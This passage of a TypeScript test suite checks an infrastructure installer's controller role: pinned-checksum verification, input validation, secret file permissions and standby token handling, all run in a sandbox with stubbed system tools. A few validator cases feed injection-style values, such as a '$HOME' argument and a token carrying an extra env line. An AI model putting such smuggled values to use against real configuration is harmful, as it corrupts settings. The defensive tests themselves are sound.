    const result = run(sandbox, [
      "--role",
      "worker-host",
      "--pool-dir",
      "relative/never-absolute",
      "--worker-user",
      "operator",
    ]);
    expect(result.status).not.toBe(0);
    expect(result.stdout).toContain(
      "Verified the agent archive against the checksum pinned by this EraInfra deployment",
    );
    expect(result.stderr).toContain("error: --pool-dir must be an absolute path");
  });

  it("refuses an archive that does not match the pin, before any provisioning", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "worker-host tamper");
    repin(sandbox, { ...CURRENT, sha256: "b".repeat(64) });
    grantWorkerHostRoot(sandbox);

    const result = run(sandbox, ["--role", "worker-host"]);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("Agent archive checksum verification failed");
    expect(result.stderr).toContain("Nothing was installed");
  });
});

// /install --role controller. Every privileged path goes through sudo, which grantRoot redirects
// under the sandbox, so these tests reach the systemd branch without writing /etc or /usr/local on
// the machine running them. Each run passes --no-prompt: a suite started from a terminal would
// otherwise inherit it, and a prompt would hang the test instead of exercising the refusal.

/** A stand-in for the controller binary: it answers `version` the way the real one does. */
function fakeController(version: string) {
  return `#!/usr/bin/env bash\nif [ "$1" = version ]; then printf 'runner-center-controller ${version}\\n'; fi\n`;
}

/** Where the sandbox's sudo puts an absolute path. */
function under(sandbox: Sandbox, absolute: string) {
  return path.join(sandbox.sudoRoot, absolute);
}

/** The env file the Worker installer writes, holding the Worker's machine credential. */
function writeWorkerEnv(envFile: string, token: string) {
  writeFileSync(envFile, `CONVEX_URL=https://example.convex.cloud\nMACHINE_TOKEN=${token}\n`);
}

function repoFile(...segments: string[]) {
  return readFileSync(path.resolve(import.meta.dirname, "..", "..", "..", ...segments));
}

// Most of these run the real installer two or three times, as root, against a stubbed systemd.
// Alone each takes a few seconds; under `pnpm check`, with every package's suite running at once,
// one took 46 s. The budget is for that contention, not for anything the installer waits on.
describe("--role controller", { timeout: 120_000 }, () => {
  const PROFILE = "erainfra-4vcpu-ubuntu-2404";
  const UNIT = `runner-center-controller@${PROFILE}`;
  const IMAGE = `ghcr.io/owner/image@sha256:${"c".repeat(64)}`;
  const ASSET = controllerAssetName("linux-x86_64");
  const SECRETS_DIR = `/etc/runner-center/secrets/${PROFILE}`;

  const CONTROLLER_SYSTEMCTL_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_SERVICE_LOG"
case "$1" in
  list-units)
    if [ -f "$RC_TEST_ACTIVE_UNITS" ]; then
      while read -r unit; do
        printf '%s loaded active running EraInfra scale-set controller\\n' "$unit"
      done < "$RC_TEST_ACTIVE_UNITS"
    fi
    ;;
  is-active)
    for unit in "$@"; do :; done
    if [ -f "$RC_TEST_FAILING_UNITS" ] && grep -qx "$unit" "$RC_TEST_FAILING_UNITS"; then exit 3; fi
    ;;
esac
exit 0
`;

  /** A Linux x86_64 host where the operator can sudo, with the account tools stubbed and logged. */
  function controllerSandbox(release: AgentRelease = CURRENT) {
    const sandbox = createSandbox(release);
    grantRoot(sandbox);
    const bin = path.join(sandbox.root, "bin");
    writeExecutable(
      path.join(bin, "uname"),
      `#!/usr/bin/env bash\ncase "$1" in -m) printf 'x86_64\\n' ;; *) printf 'Linux\\n' ;; esac\n`,
    );
    writeExecutable(path.join(bin, "systemctl"), CONTROLLER_SYSTEMCTL_STUB);
    writeExecutable(path.join(bin, "sleep"), "#!/usr/bin/env bash\nexit 0\n");
    writeExecutable(path.join(bin, "getent"), "#!/usr/bin/env bash\nexit 2\n");
    for (const tool of ["useradd", "chgrp"]) {
      writeExecutable(
        path.join(bin, tool),
        `#!/usr/bin/env bash\nprintf '${tool} %s\\n' "$*" >> "$RC_TEST_ACCOUNT_LOG"\n`,
      );
    }
    writeExecutable(
      path.join(bin, "journalctl"),
      `#!/usr/bin/env bash\nprintf 'journal for %s\\n' "$2"\n`,
    );
    const secrets = path.join(sandbox.fixtures, "secrets");
    mkdirSync(secrets, { recursive: true });
    writeFileSync(path.join(secrets, "controller-token"), "ctl-token-value\n");
    writeFileSync(path.join(secrets, "github-app.pem"), "-----BEGIN PRIVATE KEY-----\nkey\n");
    writeFileSync(path.join(secrets, "cache-key"), "k".repeat(32));
    return { sandbox, secrets };
  }

  function publishController(sandbox: Sandbox, release: AgentRelease, body: string) {
    const published = path.join(sandbox.fixtures, ASSET);
    writeFileSync(published, body);
    route(
      sandbox,
      `https://github.com/${release.repo}/releases/download/v${release.version}/${ASSET}`,
      published,
    );
    return { sha256: createHash("sha256").update(body).digest("hex"), binaryPath: published };
  }

  function pinnedController(digest: string): AgentRelease {
    return { ...CURRENT, controller: { "linux-x86_64": digest } };
  }

  /** A sandbox whose script pins the published controller 1.4.2. */
  function readyToInstall() {
    const { sandbox, secrets } = controllerSandbox();
    const published = publishController(sandbox, CURRENT, fakeController("1.4.2"));
    repin(sandbox, pinnedController(published.sha256));
    return { sandbox, secrets, published };
  }

  function ctlRun(sandbox: Sandbox, args: readonly string[], env: Record<string, string> = {}) {
    const options = spawnOptions(sandbox);
    return spawnSync("bash", [sandbox.scriptPath, "--role", "controller", "--no-prompt", ...args], {
      ...options,
      env: {
        ...options.env,
        RC_TEST_ACCOUNT_LOG: path.join(sandbox.root, "account.log"),
        RC_TEST_ACTIVE_UNITS: path.join(sandbox.root, "active-units"),
        RC_TEST_FAILING_UNITS: path.join(sandbox.root, "failing-units"),
        ...env,
      },
    });
  }

  function installArgs(secrets: string, extra: readonly string[] = []) {
    return [
      "--profile",
      PROFILE,
      "--github-config-url",
      "https://github.com/owner/repo",
      "--executor",
      "firecracker",
      "--image-release",
      IMAGE,
      "--max-runners",
      "4",
      "--controller-token-file",
      path.join(secrets, "controller-token"),
      "--github-app-client-id",
      "Iv1.abc",
      "--github-app-installation-id",
      "42",
      "--github-app-private-key-file",
      path.join(secrets, "github-app.pem"),
      ...extra,
    ];
  }

  const binaryPath = (sandbox: Sandbox) =>
    under(sandbox, "/usr/local/lib/runner-center/runner-center-controller");
  const envPath = (sandbox: Sandbox) =>
    under(sandbox, `/etc/runner-center/profiles/${PROFILE}.env`);
  const serviceLog = (sandbox: Sandbox) =>
    readLog(path.join(sandbox.root, "service.log")).trimEnd().split("\n");

  it("embeds deploy/systemd/runner-center-controller@.service byte for byte", () => {
    const repoUnit = repoFile("deploy", "systemd", "runner-center-controller@.service");
    const embedded = Buffer.from(CONTROLLER_UNIT_B64.replaceAll("\n", ""), "base64");
    expect(
      embedded.equals(repoUnit),
      "regenerate with: pnpm --filter @erainfra/backend embed-controller-unit",
    ).toBe(true);
    expect(createHash("sha256").update(repoUnit).digest("hex")).toBe(CONTROLLER_UNIT_SHA256);
    expect(renderInstallScript(SITE_URL, CURRENT)).toContain(CONTROLLER_UNIT_B64);
  });

  it("names the published asset for every pinned target", () => {
    expect(CONTROLLER_TARGETS.map(controllerAssetName)).toEqual([
      "runner-center-controller-linux-x86_64",
      "runner-center-controller-linux-arm64",
    ]);
  });

  it("prints usage without needing root", () => {
    const sandbox = createSandbox(CURRENT);
    const result = ctlRun(sandbox, ["--help"]);
    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout).toContain("runner-center-controller@NAME");
    expect(readLog(path.join(sandbox.root, "sudo.log"))).toBe("");
  });

  it("refuses an unpinned deployment while the operator is still unprivileged", () => {
    const { sandbox, secrets } = controllerSandbox(); // CURRENT pins no controller
    const result = ctlRun(sandbox, installArgs(secrets));
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("pins no controller build for linux-x86_64");
    expect(readLog(path.join(sandbox.root, "sudo.log"))).toBe("");
  });

  it("refuses a host target this deployment pins no digest for", () => {
    const { sandbox, secrets } = controllerSandbox();
    repin(sandbox, { ...CURRENT, controller: { "linux-arm64": "a".repeat(64) } });
    const result = ctlRun(sandbox, installArgs(secrets));
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("pins no controller build for linux-x86_64");
    expect(readLog(sandbox.curlLog)).toBe("");
  });

  it("lists every missing setting when there is no terminal to ask on", () => {
    const { sandbox } = readyToInstall();
    const result = ctlRun(sandbox, []);
    expect(result.status).toBe(1);
    for (const flag of [
      "--profile",
      "--github-config-url",
      "--executor",
      "--image-release",
      "--controller-token-file",
      "--github-token-file",
    ]) {
      expect(result.stderr).toContain(flag);
    }
    expect(existsSync(binaryPath(sandbox))).toBe(false);
  });

  it("refuses bad values before writing anything", () => {
    const { sandbox, secrets } = readyToInstall();
    const cases: [string[], RegExp][] = [
      [["--profile", "Bad_Name"], /Profile name Bad_Name must be lowercase/],
      [["--profile", "two--hyphens"], /single hyphens/],
      [["--image-release", "ghcr.io/owner/image:latest"], /must be immutable/],
      [["--labels", "a b"], /no spaces, quotes/],
      [["--worker-labels", "gpu nvme"], /no spaces, quotes/],
      [["--scale-set-name", "it's"], /no spaces, quotes/],
      [["--runner-group", "$HOME"], /no spaces, quotes/],
      [["--max-runners", "four"], /--max-runners must be a whole number/],
      [["--executor", "kvm"], /--executor must be/],
      [["--worker-env-file", "relative.env"], /--worker-env-file must be an absolute path/],
      [["--github-token-file", path.join(secrets, "controller-token")], /not both/],
    ];
    for (const [override, message] of cases) {
      const result = ctlRun(sandbox, [...installArgs(secrets), ...override]);
      expect(result.status, override.join(" ")).toBe(1);
      expect(result.stderr, override.join(" ")).toMatch(message);
    }
    expect(readLog(path.join(sandbox.root, "sudo.log"))).toBe("");
    expect(readLog(sandbox.curlLog)).toBe("");
  });

  it("installs the verified binary, the unit, a root-only env file and group-readable secrets", () => {
    const { sandbox, secrets } = readyToInstall();
    const result = ctlRun(
      sandbox,
      installArgs(secrets, [
        "--cache-facts-url",
        "https://cache.example/facts",
        "--cache-signing-key-file",
        path.join(secrets, "cache-key"),
        "--worker-labels",
        "gpu,nvme",
      ]),
    );
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(result.stdout).toContain(
      `Verified ${ASSET} against the checksum pinned by this EraInfra deployment`,
    );

    expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.4.2"));
    expect(statSync(binaryPath(sandbox)).mode & 0o777).toBe(0o755);
    const unit = under(sandbox, "/etc/systemd/system/runner-center-controller@.service");
    expect(
      readFileSync(unit).equals(repoFile("deploy", "systemd", "runner-center-controller@.service")),
    ).toBe(true);

    const env = readFileSync(envPath(sandbox), "utf8");
    expect(statSync(envPath(sandbox)).mode & 0o777).toBe(0o600);
    expect(env).toMatch(/^RC_CONVEX_URL=https:\/\/example\.convex\.site$/m);
    expect(env).toMatch(new RegExp(`^RC_PROFILE=${PROFILE}$`, "m"));
    expect(env).toMatch(/^RC_EXECUTOR=firecracker$/m);
    expect(env).toMatch(/^RC_MAX_RUNNERS=4$/m);
    expect(env).toMatch(/^RC_GITHUB_APP_INSTALLATION_ID=42$/m);
    expect(env).toMatch(/^RC_WORKER_LABELS=gpu,nvme$/m);
    expect(env).toContain(`RC_CONTROLLER_TOKEN_FILE=${SECRETS_DIR}/controller-token\n`);
    expect(env).toContain(`RC_GITHUB_APP_PRIVATE_KEY_FILE=${SECRETS_DIR}/github-app.pem\n`);
    expect(env).toContain(`RC_CACHE_SIGNING_KEY_FILE=${SECRETS_DIR}/cache-signing-key\n`);
    // Only the keys given: the controller's own defaults stand for the rest.
    expect(env).not.toMatch(/^RC_VCPUS=/m);
    expect(env).not.toMatch(/^RC_GITHUB_TOKEN_FILE=/m);
    // Secrets are paths, never values.
    expect(env).not.toContain("ctl-token-value");
    expect(env).not.toContain("PRIVATE KEY");

    const token = under(sandbox, `${SECRETS_DIR}/controller-token`);
    expect(readFileSync(token, "utf8")).toBe("ctl-token-value\n");
    expect(statSync(token).mode & 0o777).toBe(0o640);
    expect(statSync(under(sandbox, `${SECRETS_DIR}/github-app.pem`)).mode & 0o777).toBe(0o640);

    // Each secret is created restricted, filled, then opened to the service account's group, and
    // the env file is created 0600 before anything is written into it.
    const sudo = readLog(path.join(sandbox.root, "sudo.log")).trimEnd().split("\n");
    const created = sudo.indexOf(`install -m 0600 /dev/null ${SECRETS_DIR}/controller-token`);
    const filled = sudo.findIndex(
      (line) => line.startsWith("cp ") && line.endsWith(`${SECRETS_DIR}/controller-token`),
    );
    const opened = sudo.indexOf(`chmod 0640 ${SECRETS_DIR}/controller-token`);
    expect(created, sudo.join(" / ")).toBeGreaterThanOrEqual(0);
    expect(created).toBeLessThan(filled);
    expect(filled).toBeLessThan(opened);
    const envFile = `/etc/runner-center/profiles/${PROFILE}.env`;
    expect(sudo.indexOf(`install -m 0600 /dev/null ${envFile}`)).toBeGreaterThanOrEqual(0);
    expect(sudo.indexOf(`install -m 0600 /dev/null ${envFile}`)).toBeLessThan(
      sudo.indexOf(`tee ${envFile}`),
    );

    const account = readLog(path.join(sandbox.root, "account.log"));
    expect(account).toMatch(
      /^useradd --system --user-group --no-create-home .* runner-center-controller$/m,
    );
    expect(account).toContain(
      `chgrp runner-center-controller ${sandbox.sudoRoot}${SECRETS_DIR}/controller-token`,
    );

    const service = serviceLog(sandbox);
    const enabled = service.indexOf(`enable --now ${UNIT}`);
    expect(enabled).toBeGreaterThan(service.indexOf("daemon-reload"));
    expect(service.indexOf(`restart ${UNIT}`)).toBeGreaterThan(enabled);
    expect(service).toContain(`is-active --quiet ${UNIT}`);
  });

  it("installs nothing when the bytes do not match the pin, and leaves an installed binary alone", () => {
    const { sandbox, secrets } = controllerSandbox();
    publishController(sandbox, CURRENT, fakeController("1.4.2"));
    repin(sandbox, pinnedController("0".repeat(64)));
    mkdirSync(path.dirname(binaryPath(sandbox)), { recursive: true });
    writeExecutable(binaryPath(sandbox), fakeController("1.3.0"));

    const result = ctlRun(sandbox, installArgs(secrets));
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("Controller checksum verification failed");
    expect(result.stderr).toContain("Nothing was installed");
    expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.3.0"));
    expect(existsSync(envPath(sandbox))).toBe(false);
    expect(readLog(path.join(sandbox.root, "service.log"))).toBe("");
  });

  it("verifies a --source install exactly as a release install, and refuses corrupted bytes", () => {
    const { sandbox, secrets, published } = readyToInstall();
    const corrupted = path.join(sandbox.fixtures, "corrupted-controller");
    writeFileSync(corrupted, `${fakeController("1.4.2")}#\n`);
    const refused = ctlRun(sandbox, installArgs(secrets, ["--source", `file://${corrupted}`]));
    expect(refused.status).toBe(1);
    expect(refused.stderr).toContain("Controller checksum verification failed");
    expect(existsSync(binaryPath(sandbox))).toBe(false);

    const result = ctlRun(
      sandbox,
      installArgs(secrets, ["--source", `file://${published.binaryPath}`]),
    );
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.4.2"));
    expect(readLog(sandbox.curlLog)).not.toContain(ASSET);
  });

  it("keeps an existing env file unless --reconfigure is given", () => {
    const { sandbox, secrets } = readyToInstall();
    mkdirSync(path.dirname(envPath(sandbox)), { recursive: true });
    writeFileSync(envPath(sandbox), "RC_PROFILE=hand-written\n", { mode: 0o600 });

    const kept = ctlRun(sandbox, installArgs(secrets));
    expect(kept.status, `${kept.stdout}\n${kept.stderr}`).toBe(0);
    expect(kept.stderr).toContain("rerun with --reconfigure");
    expect(readFileSync(envPath(sandbox), "utf8")).toBe("RC_PROFILE=hand-written\n");
    // A kept Profile still gets the verified binary and a restart onto it.
    expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.4.2"));
    expect(serviceLog(sandbox)).toContain(`restart ${UNIT}`);

    // Only --profile is needed to refresh a Profile this host already serves.
    const refreshed = ctlRun(sandbox, ["--profile", PROFILE]);
    expect(refreshed.status, `${refreshed.stdout}\n${refreshed.stderr}`).toBe(0);

    const replaced = ctlRun(sandbox, installArgs(secrets, ["--reconfigure"]));
    expect(replaced.status, `${replaced.stdout}\n${replaced.stderr}`).toBe(0);
    expect(readFileSync(envPath(sandbox), "utf8")).toMatch(
      new RegExp(`^RC_PROFILE=${PROFILE}$`, "m"),
    );
    expect(statSync(envPath(sandbox)).mode & 0o777).toBe(0o600);
  });

  it("leaves a Worker host's files exactly as they were", () => {
    const { sandbox, secrets } = readyToInstall();
    const seeded: [string, string, number][] = [
      ["/usr/local/lib/runner-center/runner-center-runtime", "#!/bin/sh\n# runtime\n", 0o755],
      ["/etc/runner-center/runtime.env", "RC_RUNTIME=1\n", 0o600],
      ["/etc/systemd/system/runner-center-runtime.service", "[Unit]\n", 0o644],
    ];
    for (const [file, contents, mode] of seeded) {
      mkdirSync(path.dirname(under(sandbox, file)), { recursive: true });
      writeFileSync(under(sandbox, file), contents);
      chmodSync(under(sandbox, file), mode);
    }
    // Unusual directory modes, so a chmod of a shared directory would show.
    chmodSync(under(sandbox, "/etc/runner-center"), 0o751);
    chmodSync(under(sandbox, "/usr/local/lib/runner-center"), 0o751);

    const result = ctlRun(sandbox, installArgs(secrets));
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    for (const [file, contents, mode] of seeded) {
      expect(readFileSync(under(sandbox, file), "utf8"), file).toBe(contents);
      expect(statSync(under(sandbox, file)).mode & 0o777, file).toBe(mode);
    }
    expect(statSync(under(sandbox, "/etc/runner-center")).mode & 0o777).toBe(0o751);
    expect(statSync(under(sandbox, "/usr/local/lib/runner-center")).mode & 0o777).toBe(0o751);
    expect(serviceLog(sandbox).join("\n")).not.toContain("runner-center-runtime");
    expect(readLog(path.join(sandbox.root, "account.log"))).not.toMatch(/ runner-center$/m);
  });

  // A standby on a Worker signs in with the Worker's machine credential (ADR 0014). The Worker's
  // account is modeled as "worker", whose home getent reports as a directory in the sandbox, so
  // the SUDO_USER default is exercised exactly as it resolves on a real host.
  const WORKER_TOKEN = "0123456789abcdef0123456789ABCDEF";
  const MACHINE_TOKEN_PATH = `${SECRETS_DIR}/machine-token`;
  const AS_WORKER = { SUDO_USER: "worker" };

  function workerHost(sandbox: Sandbox, token = WORKER_TOKEN) {
    const home = path.join(sandbox.root, "worker-home");
    const envFile = path.join(home, ".runner-center", "agent", ".env");
    mkdirSync(path.dirname(envFile), { recursive: true });
    writeWorkerEnv(envFile, token);
    writeExecutable(
      path.join(sandbox.root, "bin", "getent"),
      [
        "#!/usr/bin/env bash",
        `if [ "$1" = passwd ] && [ "$2" = worker ]; then printf 'worker:x:1000:1000::%s:/bin/bash\\n' '${home}'; exit 0; fi`,
        "exit 2",
        "",
      ].join("\n"),
    );
    return envFile;
  }

  function secretsWritten(sandbox: Sandbox) {
    const directory = under(sandbox, SECRETS_DIR);
    return existsSync(directory) ? readdirSync(directory).toSorted() : [];
  }

  /** Nothing of the Profile, the binary or the unit is on the host. */
  function expectNothingWritten(sandbox: Sandbox) {
    expect(existsSync(envPath(sandbox))).toBe(false);
    expect(existsSync(binaryPath(sandbox))).toBe(false);
    expect(existsSync(under(sandbox, SECRETS_DIR))).toBe(false);
    expect(readLog(path.join(sandbox.root, "service.log"))).toBe("");
  }

  it("installs a standby from a Worker env file, with the Worker's token and nothing else", () => {
    const { sandbox, secrets } = readyToInstall();
    const workerEnv = workerHost(sandbox);
    const result = ctlRun(sandbox, [
      "--profile",
      PROFILE,
      "--worker-env-file",
      workerEnv,
      "--cache-facts-url",
      "https://cache.example/facts",
      "--cache-signing-key-file",
      path.join(secrets, "cache-key"),
    ]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);

    expect(readFileSync(envPath(sandbox), "utf8")).toBe(
      [
        `# Written by ${SITE_URL}/install --role controller. Rerun it with --reconfigure to replace this file.`,
        "# A standby on a Worker: it reads its Profile and GitHub credentials from the control plane.",
        `RC_CONVEX_URL=${SITE_URL}`,
        `RC_PROFILE=${PROFILE}`,
        `RC_MACHINE_TOKEN_FILE=${MACHINE_TOKEN_PATH}`,
        "RC_CACHE_FACTS_URL=https://cache.example/facts",
        `RC_CACHE_SIGNING_KEY_FILE=${SECRETS_DIR}/cache-signing-key`,
        "",
      ].join("\n"),
    );
    expect(statSync(envPath(sandbox)).mode & 0o777).toBe(0o600);

    // The token alone, not the Worker's whole env file, restricted then opened to the group.
    const token = under(sandbox, MACHINE_TOKEN_PATH);
    expect(readFileSync(token, "utf8")).toBe(WORKER_TOKEN);
    expect(statSync(token).mode & 0o777).toBe(0o640);
    expect(readLog(path.join(sandbox.root, "account.log"))).toContain(
      `chgrp runner-center-controller ${sandbox.sudoRoot}${MACHINE_TOKEN_PATH}`,
    );
    const sudo = readLog(path.join(sandbox.root, "sudo.log")).trimEnd().split("\n");
    const created = sudo.indexOf(`install -m 0600 /dev/null ${MACHINE_TOKEN_PATH}`);
    expect(created, sudo.join(" / ")).toBeGreaterThanOrEqual(0);
    expect(created).toBeLessThan(sudo.indexOf(`tee ${MACHINE_TOKEN_PATH}`));
    expect(sudo.indexOf(`tee ${MACHINE_TOKEN_PATH}`)).toBeLessThan(
      sudo.indexOf(`chmod 0640 ${MACHINE_TOKEN_PATH}`),
    );

    // No controller token and no GitHub credential on the host.
    expect(secretsWritten(sandbox)).toEqual(["cache-signing-key", "machine-token"]);
    // The token never reaches a command line or the output.
    expect(sudo.join("\n")).not.toContain(WORKER_TOKEN);
    expect(result.stdout + result.stderr).not.toContain(WORKER_TOKEN);

    expect(result.stdout).toContain(`${UNIT} is running the controller 1.4.2 as a standby`);
    expect(result.stdout).toContain(
      "It takes the Profile's lease when no other controller holds it; the dashboard's Profiles table shows its status.",
    );
    expect(serviceLog(sandbox)).toContain(`restart ${UNIT}`);
  });

  it("finds the Worker env file in the sudo user's home, and never in root's", () => {
    const { sandbox } = readyToInstall();
    workerHost(sandbox);
    const asRoot = ctlRun(sandbox, ["--profile", PROFILE], { SUDO_USER: "root" });
    expect(asRoot.status).toBe(1);
    expect(asRoot.stderr).toContain("--controller-token-file");
    expectNothingWritten(sandbox);

    const result = ctlRun(sandbox, ["--profile", PROFILE], AS_WORKER);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(readFileSync(envPath(sandbox), "utf8")).toBe(
      [
        `# Written by ${SITE_URL}/install --role controller. Rerun it with --reconfigure to replace this file.`,
        "# A standby on a Worker: it reads its Profile and GitHub credentials from the control plane.",
        `RC_CONVEX_URL=${SITE_URL}`,
        `RC_PROFILE=${PROFILE}`,
        `RC_MACHINE_TOKEN_FILE=${MACHINE_TOKEN_PATH}`,
        "",
      ].join("\n"),
    );
    expect(readFileSync(under(sandbox, MACHINE_TOKEN_PATH), "utf8")).toBe(WORKER_TOKEN);
    expect(secretsWritten(sandbox)).toEqual(["machine-token"]);
  });

  it("refuses Profile and GitHub settings on a standby, and writes nothing", () => {
    const { sandbox, secrets } = readyToInstall();
    const workerEnv = workerHost(sandbox);
    const viaFlag = ctlRun(sandbox, [
      "--profile",
      PROFILE,
      "--worker-env-file",
      workerEnv,
      "--executor",
      "firecracker",
      "--github-token-file",
      path.join(secrets, "github-app.pem"),
    ]);
    expect(viaFlag.status).toBe(1);
    expect(viaFlag.stderr).toContain(
      "reads the Profile and GitHub credentials from the control plane",
    );
    expect(viaFlag.stderr).toContain("Remove --executor --github-token-file");
    expect(viaFlag.stderr).toContain("--controller-token-file");
    expectNothingWritten(sandbox);

    // The dedicated-host flags minus the controller token, on a Worker found through sudo.
    const dedicatedArgs = installArgs(secrets);
    const tokenFlag = dedicatedArgs.indexOf("--controller-token-file");
    dedicatedArgs.splice(tokenFlag, 2);
    const viaSudo = ctlRun(sandbox, dedicatedArgs, AS_WORKER);
    expect(viaSudo.status).toBe(1);
    expect(viaSudo.stderr).toContain(
      "Remove --github-config-url --executor --image-release --max-runners --github-app-client-id --github-app-installation-id --github-app-private-key-file",
    );
    expectNothingWritten(sandbox);
  });

  it("requires --controller-token-file for every Profile-shape and GitHub flag, even without a Worker", () => {
    const { sandbox } = readyToInstall();
    for (const flag of [
      "--github-config-url",
      "--executor",
      "--image-release",
      "--vcpus",
      "--memory-mib",
      "--warm-pool",
      "--fit-policy",
      "--min-runners",
      "--max-runners",
      "--scale-set-name",
      "--labels",
      "--worker-labels",
      "--runner-group",
      "--github-app-client-id",
      "--github-app-installation-id",
      "--github-app-private-key-file",
      "--github-token-file",
    ]) {
      // An empty or invalid value must still get the explanation for standby settings.
      for (const value of ["", "unused"]) {
        const result = ctlRun(sandbox, ["--profile", PROFILE, flag, value]);
        expect(result.status, flag).toBe(1);
        expect(result.stderr, flag).toContain(
          "A Worker's standby reads the Profile and GitHub credentials from the control plane.",
        );
        expect(result.stderr, flag).toContain(`Remove ${flag}, or add --controller-token-file`);
        expectNothingWritten(sandbox);
      }
    }
    expect(readLog(path.join(sandbox.root, "sudo.log"))).toBe("");
  });

  it("refuses a Worker env file whose token is not 32 hex characters, and writes nothing", () => {
    const { sandbox } = readyToInstall();
    const workerEnv = workerHost(sandbox);
    for (const token of [
      "",
      "abc123",
      "g".repeat(32),
      "a".repeat(33),
      `${"a".repeat(31)} `,
      `${WORKER_TOKEN}\nMACHINE_TOKEN=${WORKER_TOKEN}`,
    ]) {
      writeWorkerEnv(workerEnv, token);
      for (const [args, env] of [
        [["--profile", PROFILE, "--worker-env-file", workerEnv], {}],
        [["--profile", PROFILE], AS_WORKER],
      ] as const) {
        const result = ctlRun(sandbox, args, env);
        expect(result.status, token).toBe(1);
        expect(result.stderr, token).toContain("is not the 32 hex characters");
        if (token.trim()) expect(result.stderr, token).not.toContain(token.trim());
        expectNothingWritten(sandbox);
      }
    }

    // A named file with no token in it is refused too, where a missing default is not a Worker.
    writeFileSync(workerEnv, "CONVEX_URL=https://example.convex.cloud\n");
    const empty = ctlRun(sandbox, ["--profile", PROFILE, "--worker-env-file", workerEnv]);
    expect(empty.status).toBe(1);
    expect(empty.stderr).toContain("holds no MACHINE_TOKEN line");
    const missing = ctlRun(sandbox, [
      "--profile",
      PROFILE,
      "--worker-env-file",
      path.join(sandbox.root, "absent.env"),
    ]);
    expect(missing.status).toBe(1);
    expect(missing.stderr).toContain("Cannot read the Worker env file");
    expectNothingWritten(sandbox);
  });

  it("refreshes a standby's machine token on a rerun with only --profile", () => {
    const { sandbox } = readyToInstall();
    const workerEnv = workerHost(sandbox);
    const installed = ctlRun(sandbox, ["--profile", PROFILE], AS_WORKER);
    expect(installed.status, `${installed.stdout}\n${installed.stderr}`).toBe(0);
    const envBefore = readFileSync(envPath(sandbox), "utf8");

    // The Worker re-registered and holds a new token.
    const renewed = "f".repeat(32);
    writeWorkerEnv(workerEnv, renewed);
    const repaired = ctlRun(sandbox, ["--profile", PROFILE], AS_WORKER);
    expect(repaired.status, `${repaired.stdout}\n${repaired.stderr}`).toBe(0);
    expect(repaired.stdout).toContain(`Refreshed ${MACHINE_TOKEN_PATH}`);
    expect(repaired.stdout).toContain("as a standby");
    expect(readFileSync(envPath(sandbox), "utf8")).toBe(envBefore);
    const token = under(sandbox, MACHINE_TOKEN_PATH);
    expect(readFileSync(token, "utf8")).toBe(renewed);
    expect(statSync(token).mode & 0o777).toBe(0o640);
    expect(repaired.stdout + repaired.stderr).not.toContain(renewed);

    // With no Worker credential to read, the rerun keeps the copy it has.
    const kept = ctlRun(sandbox, ["--profile", PROFILE]);
    expect(kept.status, `${kept.stdout}\n${kept.stderr}`).toBe(0);
    expect(kept.stdout).not.toContain("Refreshed");
    expect(readFileSync(token, "utf8")).toBe(renewed);
  });

  // The dual-name release (docs/runbooks/rename-phase-2.md, section 1): an operator moving a
  // Profile's env file to the new names (section 3, step 1) must not turn a rerun into a
  // dedicated-host install or a lost token refresh.
  it("reads a kept standby env file under either name for the machine token file", () => {
    const { sandbox } = readyToInstall();
    const workerEnv = workerHost(sandbox);
    const installed = ctlRun(sandbox, ["--profile", PROFILE], AS_WORKER);
    expect(installed.status, `${installed.stdout}\n${installed.stderr}`).toBe(0);
    const legacy = readFileSync(envPath(sandbox), "utf8");
    expect(legacy).toContain(`RC_MACHINE_TOKEN_FILE=${MACHINE_TOKEN_PATH}\n`);

    for (const [label, env] of [
      [
        "only the new name",
        legacy.replace("RC_MACHINE_TOKEN_FILE=", "ERAINFRA_MACHINE_TOKEN_FILE="),
      ],
      [
        "both names, equal",
        legacy.replace(
          `RC_MACHINE_TOKEN_FILE=${MACHINE_TOKEN_PATH}\n`,
          `RC_MACHINE_TOKEN_FILE=${MACHINE_TOKEN_PATH}\nERAINFRA_MACHINE_TOKEN_FILE=${MACHINE_TOKEN_PATH}\n`,
        ),
      ],
    ] as const) {
      writeFileSync(envPath(sandbox), env);
      const renewed = (label.length % 10).toString().repeat(32);
      writeWorkerEnv(workerEnv, renewed);
      const rerun = ctlRun(sandbox, ["--profile", PROFILE], AS_WORKER);
      expect(rerun.status, `${label}: ${rerun.stdout}\n${rerun.stderr}`).toBe(0);
      expect(rerun.stdout, label).toContain(`Refreshed ${MACHINE_TOKEN_PATH}`);
      expect(rerun.stdout, label).toContain("as a standby");
      expect(readFileSync(under(sandbox, MACHINE_TOKEN_PATH), "utf8"), label).toBe(renewed);
      // The operator's file is theirs; a rerun that keeps it does not rewrite it.
      expect(readFileSync(envPath(sandbox), "utf8"), label).toBe(env);
    }
  });

  it("refuses a kept env file whose two names for the token file disagree", () => {
    const { sandbox } = readyToInstall();
    const workerEnv = workerHost(sandbox);
    const installed = ctlRun(sandbox, ["--profile", PROFILE], AS_WORKER);
    expect(installed.status, `${installed.stdout}\n${installed.stderr}`).toBe(0);
    const token = under(sandbox, MACHINE_TOKEN_PATH);
    const before = readFileSync(token, "utf8");
    writeFileSync(
      envPath(sandbox),
      `${readFileSync(envPath(sandbox), "utf8")}ERAINFRA_MACHINE_TOKEN_FILE=/etc/runner-center/secrets/elsewhere/machine-token\n`,
    );
    writeWorkerEnv(workerEnv, "e".repeat(32));

    const rerun = ctlRun(sandbox, ["--profile", PROFILE], AS_WORKER);
    expect(rerun.status).toBe(1);
